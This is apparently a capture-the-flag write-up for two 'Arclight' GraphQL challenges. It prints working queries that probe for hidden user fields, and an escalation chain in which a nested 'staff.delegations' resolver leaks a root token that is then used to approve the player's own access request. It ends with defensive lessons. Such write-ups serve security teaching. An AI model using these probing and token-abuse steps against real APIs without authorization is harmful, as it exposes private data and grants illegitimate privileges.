# Arclight Writeup

## Challenge 1: Arclight - 1

### Objective

The application presents a staff portal with a directory, but the directory UI only displays a limited summary. The objective was to identify whether the underlying API exposed additional user properties.

### Discovery

1. Registered a normal account and signed in.
2. Opened the **Console** section from the dashboard.
3. Confirmed that the console sends GraphQL queries to `/graphql`.
4. Ran the baseline query:

```graphql
{ users { id username email } }
```

This returned five user records.

5. Tested additional fields on the `User` type because the UI-selected fields were not necessarily the complete API schema:

```graphql
{ users { role } }
{ users { flag } }
{ users { password } }
```

The `role` and `flag` fields were accepted by the GraphQL API. The `password` field was rejected as unknown.

6. Queried the useful fields together:

```graphql
{ users { id username role flag } }
```

The response showed that the first user had an administrative role and a populated hidden value. The other users returned null for that field.

### Vulnerability

The GraphQL resolver exposed object properties that were not requested by the frontend. Authorization was effectively implemented through the UI's query selection rather than enforced at the API field level. This is excessive data exposure / Broken Object Property Level Authorization.

### Evidence

The key console screenshots were captured during the solve and showed:

- The baseline list of users.
- The expanded query returning the hidden property on the administrator record.

---

## Challenge 2: Arclight - 2

### Objective

The second application uses tiered access. A standard user must obtain root access before the protected vault query succeeds.

### Initial Access Check

1. Registered a fresh account and signed in.
2. Sent the following query to `/graphql`:

```graphql
{ me { username role } }
```

The account was confirmed as `standard`.

3. Tested the protected resource:

```graphql
{ rootVault }
```

The API rejected the request with a root-access-required error.

### Access Request

Created a root access request:

```graphql
mutation {
  createAccessRequest(tier: "root") {
    id
    requester
    tier
    status
  }
}
```

The request was created with `pending` status.

### Nested Resolver Discovery

The direct delegation query was intended to be owner-only, so the nested object relationship was tested through the `Staff` type:

```graphql
{
  staff(id: 1) {
    id
    username
    delegations {
      id
      owner
      tier
      token
    }
  }
}
```

This returned the delegation belonging to the privileged staff member, including a root-tier delegation token. The same object was protected when accessed through the direct delegation resolver, but not through `staff.delegations`.

### Privilege Escalation

Used the leaked root-tier delegation token as the sponsor for the pending request:

```graphql
mutation {
  approveRequest(id: REQUEST_ID, sponsor: "LEAKED_TOKEN") {
    id
    status
  }
}
```

The request became approved. The account was then checked again:

```graphql
{ me { username role } }
```

Its role had changed to `root`.

Finally, queried the vault:

```graphql
{ rootVault }
```

The API returned the challenge flag. The flag value is intentionally omitted from this document.

### Vulnerability

The challenge combines two authorization flaws:

- **BOLA through an unguarded nested resolver:** the direct `delegation(id)` path enforced ownership, but `staff(id).delegations` exposed the same delegation objects without equivalent authorization.
- **Broken function-level authorization:** `approveRequest` verified that the sponsor token was privileged, but did not verify that the caller was entitled to use it.

### Evidence

The essential screenshots were saved in [`arclight2-evidence`](arclight2-evidence):

- [Initial access check](arclight2-evidence/01-initial-access.png)
- [Nested delegation exposure](arclight2-evidence/02-nested-delegation.png)
- [Root vault unlocked](arclight2-evidence/03-root-vault.png)

## Lessons

- The frontend is not an authorization boundary.
- Disabling GraphQL introspection does not prevent field probing.
- Authorization must be applied consistently to every path that returns an object.
- Privileged tokens must be bound to an authorized actor, not merely checked for validity.
